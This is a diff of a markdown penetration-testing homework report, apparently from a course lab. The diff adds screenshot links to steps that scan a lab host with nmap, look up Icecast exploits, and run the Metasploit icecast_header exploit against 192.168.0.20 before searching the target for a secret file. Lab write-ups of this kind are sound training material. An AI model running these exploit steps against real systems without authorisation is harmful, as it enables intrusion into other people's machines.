@@ -62,11 +62,15 @@ Report.docx
 
 Answer: `nmap -sV 192.168.0.20`
 
+![Nmap Scan](https://github.com/BrendanT2248/Week-17-Homework-Penetration-Testing-1/blob/main/Images/nmap%20scan.png)
+
 **From the previous step, we see that the Icecast service is running. Let's start by attacking that service. Search for any Icecast exploits:**
 
 **Run the SearchSploit commands to show available Icecast exploits.**
 
 Answer: `searchsploit icecast`
+
+![Searchsploit Icecast](https://github.com/BrendanT2248/Week-17-Homework-Penetration-Testing-1/blob/main/Images/searchsploit%20icecast.PNG)
 
 **Now that we know which exploits are available to us, let's start Metasploit:**
 
@@ -74,16 +78,22 @@ Answer: `searchsploit icecast`
 
 Answer: `msfconsole`
 
+![msfconsole](https://github.com/BrendanT2248/Week-17-Homework-Penetration-Testing-1/blob/main/Images/msfconsole.PNG)
+
 **Search for the Icecast module and load it for use.**
 
 **Run the command to search for the Icecast module:**
 
 Answer: `search icecast`
 
+![Search Icecast](https://github.com/BrendanT2248/Week-17-Homework-Penetration-Testing-1/blob/main/Images/search%20icecast.PNG)
+
 **Run the command to use the Icecast module:**
 **Note: Instead of copying the entire path to the module, you can use the number in front of it.**
 
 Answer: `use exploit/windows/http/icecast_header`
+
+
 
 **Set the RHOST to the target machine.**
 
@@ -91,11 +101,17 @@ Answer: `use exploit/windows/http/icecast_header`
 
 Answer: `set RHOST 192.168.0.20`
 
+![Set RHOST 1](https://github.com/BrendanT2248/Week-17-Homework-Penetration-Testing-1/blob/main/Images/set%20RHOST%201.PNG)
+
+![Set RHOST 2](https://github.com/BrendanT2248/Week-17-Homework-Penetration-Testing-1/blob/main/Images/set%20RHOST%202.PNG)
+
 **Run the Icecast exploit.**
 
 **Run the command that runs the Icecast exploit.**
 
 Answer: `exploit` (while in module)
+
+![Exploit command](https://github.com/BrendanT2248/Week-17-Homework-Penetration-Testing-1/blob/main/Images/exploit.PNG)
 
 **Run the command that performs a search for the secretfile.txt on the target.**
 
